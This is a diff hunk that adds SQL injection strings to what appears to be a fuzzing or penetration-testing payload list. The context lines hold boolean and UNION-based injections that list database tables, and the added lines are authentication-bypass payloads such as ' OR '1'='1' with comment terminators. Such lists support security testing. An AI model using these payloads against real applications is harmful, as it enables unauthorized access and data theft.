@@ -11,4 +11,9 @@ a
 1' and non_existant_table = '1
 ' or username is not NULL or username = '
 1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+' OR '1'='1'#
+' OR '1'='1'-- 
+' OR 1=1#
+') OR '1'='1'-- 
+") OR ("1"="1"--
 
